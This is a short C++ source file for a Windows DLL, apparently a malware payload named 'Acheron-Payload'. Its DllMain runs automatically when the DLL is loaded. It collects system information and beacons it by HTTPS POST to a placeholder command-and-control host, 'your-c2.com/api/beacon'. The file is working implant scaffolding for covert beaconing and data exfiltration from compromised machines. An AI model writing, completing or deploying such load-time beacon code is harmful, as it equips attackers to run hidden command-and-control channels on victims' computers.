#include <windows.h>
#include <string>
#include <winhttp.h>

#pragma comment(lib, "winhttp.lib")

void SendInfo()
{
    SYSTEM_INFO si;
    GetSystemInfo(&si);
    std::string data = "{\"cpu\": " + std::to_string(si.dwNumberOfProcessors) + "}";

    HINTERNET hSession = WinHttpOpen(L"Acheron-Payload", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, NULL, NULL, 0);
    if (!hSession) return;
    HINTERNET hConnect = WinHttpConnect(hSession, L"your-c2.com", 443, 0);
    if (!hConnect) { WinHttpCloseHandle(hSession); return; }
    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"POST", L"/api/beacon", NULL, NULL, NULL, WINHTTP_FLAG_SECURE);
    if (!hRequest) { WinHttpCloseHandle(hConnect); WinHttpCloseHandle(hSession); return; }

    std::wstring wideData = std::wstring(data.begin(), data.end());
    WinHttpSendRequest(hRequest, L"Content-Type: application/json\r\n",
                       wcslen(L"Content-Type: application/json\r\n"),
                       (LPVOID)wideData.c_str(), (DWORD)(wideData.size() * sizeof(wchar_t)),
                       (DWORD)(wideData.size() * sizeof(wchar_t)), 0);
    WinHttpReceiveResponse(hRequest, NULL);
    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved)
{
    if (ul_reason_for_call == DLL_PROCESS_ATTACH)
    {
        DisableThreadLibraryCalls(hModule);
        SendInfo();
    }
    return TRUE;
}